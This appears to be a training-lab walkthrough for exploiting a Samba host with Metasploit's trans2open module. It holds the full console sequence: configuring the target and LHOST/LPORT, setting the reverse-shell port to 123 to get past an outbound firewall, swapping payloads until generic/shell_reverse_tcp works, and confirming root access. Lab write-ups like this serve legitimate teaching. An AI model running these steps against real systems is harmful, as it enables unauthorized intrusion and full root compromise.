1) Launch Metasploit Console

-> msfconsole

2) Search available exploits

-> search type:exploit trans2open

3) Because the target is a Linux host, choose the Linux based trans2open exploit

-> use exploit/linux/samba/trans2open

4) Use the show options command to obtain further information and the parameter requirements. This tells us that LHOST and LPORT can be configured. Ensure that the LHOST is set to your host's IP address within the network. You can determine your IP address by using the ifconfig command in the command-line interface (CLI). The IP address should begin with 10.10.10., and the last segment will be unique to your machine.

5) We know that the firewall on the server allows outbound connections on the NTP port. A quick internet search tells us that NTP runs on port 123 so we'll use the set command to tune the exploit to bypass the firewall requirements using port 123.

-> set LPORT 123

6) Run the show options command again to confirm that LHOST and LPORT are correctly set.

-> show options

7) Run the exploit.

-> run

And we get an error: Exploit failed: One or more options failed to validate: RHOSTS

8) Use the set command to set the RHOSTS

-> set RHOST 10.10.10.15

9) Run the exploit again

-> run

This time we see that the Meterpreter session is opening and closing. This means that the payload is not compatible with the exploit. Use CTRL-C to cancel.

10) Run set payload and then click tab twice to see the list of possible payloads. Copy the exploit that uses a reverse payload on TCP and use the set payload command to set it.

-> set payload linux/x86/meterpreter/reverse_tcp

Run the exploit again:

-> run

The session is still dying! Hit CTRL-C to stop it.

11) The settings are correct so it is time to try a different payload type. Instead of using meterpreter we can try shell or generic shell. We'll run set payload and hit tab again twice to see our options. We'll copy the generic shell option, and paste it after set payload to change the payload again.

-> set payload generic/shell_reverse_tcp

We'll launch the exploit again with the runcommand:

-> run

It worked! We see Command shell session 9 opened

12) Next, we can run whoami and hostname to check our results:

-> whoami

Returns root which tells me I have root access

-> hostname

Returns testlab.example.com which prove that we were successful in hacking the machine!








